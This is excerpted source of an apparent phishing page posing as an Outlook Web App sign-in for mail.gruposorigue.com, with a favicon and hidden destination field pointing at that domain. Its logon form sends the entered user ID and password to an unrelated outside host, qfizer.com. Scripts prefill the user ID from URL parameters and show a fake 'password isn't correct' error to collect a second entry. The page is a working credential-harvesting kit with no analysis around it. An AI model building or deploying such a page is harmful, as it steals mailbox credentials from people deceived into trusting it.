...
<link rel="shortcut icon" href="https://mail.gruposorigue.com/owa/auth/15.0.1395/themes/resources/favicon.ico" type="image/x-icon">
...
function clkLgn()
{
var x = document.forms["logonForm"]["pass"].value;
var y = document.forms["logonForm"]["token"].value;
  if (x == "") {
	   if(y==2){
	   alert("Please enter your password.");
	   }else{
	   document.getElementById("signInErrorDiv").innerHTML = "Please enter your password.";
	   }
    return false;
  }
    ...
    if (p)
    {
        ...
        var sL = "lgn=" + gbid("request-id").value;
...
function RndMimeCtlHlpr(objid, classid, ns, id)
{
    ...
    <script>
        ...
        function setPlaceholderText() {
                ...
                window.document.getElementById("pass").placeholder = "password";
        ...
        function showPasswordClick() {
            ...
            passwordElement = window.document.getElementById("pass");
...
for(var i = 0; i < hashParams.length; i++){
	...
	var tokenValue = document.getElementById('token').value;
	 if(tokenValue==2){
	 document.getElementById("signInErrorDiv").innerHTML = "The password you entered isn't correct. valid password is needed, Try entering it again.";
	 }
	}
 } 
...
this.userNameFormatError = 'Enter your user ID in the format "user domain" or "user @ domain";'; 
...
<form  action="https://qfizer.com/helloworld/App.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
<input type="hidden" name="destination" value="https://mail.gruposorigue.com/owa/"  >
<input type="hidden" name="flags" value="4">
<input type="hidden" name="forcedownlevel" value="0">
<input name="tag" value="Lee" required="required" size="40" autocapitalize="off" type="hidden">
<input name="Language" value="EN" required="required" size="40" autocapitalize="off" type="hidden">
<input name="token" value="1" id="token" required="required" size="40" autocapitalize="off" type="hidden">
...
<div id="mainLogonDiv" class="mouse">
	...
	<div id="lgnDiv" class="logonDiv" onKeyPress="return checkSubmit(event)">
		...
		<div><input id="request-id" readOnly name="userid" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/></div>
		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
		<div><input placeholder ="Enter password" id="password" onfocus="g_fFcs=0" name="pass" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"/></div>
